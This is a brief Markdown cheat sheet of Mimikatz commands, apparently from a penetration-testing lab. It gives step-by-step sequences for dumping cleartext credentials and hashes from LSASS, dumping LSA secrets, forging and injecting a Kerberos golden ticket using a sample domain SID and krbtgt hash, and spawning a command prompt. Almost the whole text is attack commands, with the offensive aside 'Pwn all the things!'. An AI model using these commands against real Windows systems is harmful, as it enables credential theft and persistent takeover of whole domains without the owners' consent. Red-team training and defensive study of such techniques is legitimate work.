# Mimikatz

## Recovering LSASS
```
Open an Administrative prompt
mimikatz.exe 
mimikatz(commandline)# privilege::debug
mimikatz(commandline)# log credentials.txt
mimikatz(commandline)# sekurlsa::logonpasswords
Pwn all the things!
```

## Dump the LSA
```
mimikatz.exe 
mimikatz(commandline)# privilege::debug
mimikatz(commandline)# log lsa-dump.txt
mimikatz(commandline)# lsadump::lsa /patch
```

## Generate Golden Ticket
Prerequisites:
- Domain SID 
- NTLM hash of account
```
mimikatz.exe 
mimikatz(commandline)# privilege::debug
mimikatz (commandline)# kerberos::golden /user:Administrator /domain:hacklab.local /sid:S-1-5-21-771578074-87863937-975173046 /krbtgt:59e520df53bda9d2f8513b049e349b24 /id:500 /ptt
```

## Opening Command Prompt from Mimikatz
```
mimikatz.exe 
mimikatz(commandline)# privilege::debug
mimikatz(commandline)# misc::cmd
```